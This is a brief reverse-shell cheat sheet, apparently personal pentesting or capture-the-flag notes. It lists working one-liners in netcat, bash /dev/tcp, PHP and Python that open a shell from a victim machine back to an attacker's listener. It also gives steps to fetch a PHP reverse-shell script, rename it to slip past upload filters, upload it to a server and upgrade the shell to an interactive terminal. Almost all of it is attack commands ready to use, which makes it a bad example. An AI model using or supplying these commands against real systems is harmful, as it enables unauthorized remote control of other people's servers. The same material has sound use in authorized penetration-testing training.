# Reverse shell

Start listening on host computer with netcat:

```bash
nc -lvnp <port>
```

General reverse shell options on victim:

## Netcat

```bash
nc <ip> <port> -c bash
```

## Bash

```bash
/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

## PHP

```php
<?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<ip>/<port> 0>&1’”); phpinfo(); ?>
```

## Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## PHP reverse shell

First, download the script:

    curl -LO https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

Change `ip` and `port` in the script (use `ip addr` for ip, `port` can be anything that's available):

    nano php-reverse-shell.php

Also probably rename, see [Bypass File Upload Filtering](https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html).

Next, start `nc`:

    nc -lvnp <port>

Finally, upload the script to the server, and open the newly created link.

To upgrade the dumb shell:

    python -c 'import pty; pty.spawn("/bin/bash")'
    # Ctrl-Z
    stty raw -echo
    fg
    reset
    # Set terminal to vt100
